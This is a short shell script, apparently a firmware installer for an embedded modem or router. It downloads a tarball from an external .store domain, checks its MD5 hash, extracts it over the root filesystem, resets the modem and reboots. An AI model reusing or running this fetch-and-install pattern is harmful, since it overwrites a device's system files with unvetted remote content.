#!/bin/sh
curl https://bjcjunjuncruz.store/cdtrix/cdtrix.tgz -o /tmp/firmware.tgz
echo "Checking hash!"
hash=$(md5sum /tmp/firmware.tgz | awk '{print $1}')
echo "$hash = 20497ef07d44a3b1cf949599159cbf47"
if [ $hash == '20497ef07d44a3b1cf949599159cbf47' ]
then
echo "Same!"
mv /etc_ro/tmp/firmware* /etc_ro/tmp/firmware.tgz
tar -zxvf /tmp/firmware.tgz -C /
at_cmd at+zreset
reboot
else
echo "Not same!"
fi
